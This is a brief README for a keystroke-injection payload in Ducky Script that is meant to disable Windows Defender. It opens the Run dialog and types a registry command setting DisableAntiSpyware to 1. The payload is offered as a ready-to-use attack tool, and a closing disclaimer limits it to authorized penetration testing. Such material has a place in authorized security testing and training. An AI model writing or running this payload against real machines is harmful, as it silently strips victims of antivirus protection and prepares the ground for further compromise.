# Disable Antivirus

Disables Windows Defender antivirus through a registry change.

```
DELAY 500
GUI r
DELAY 200
STRING reg add "HKCU\\Software\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.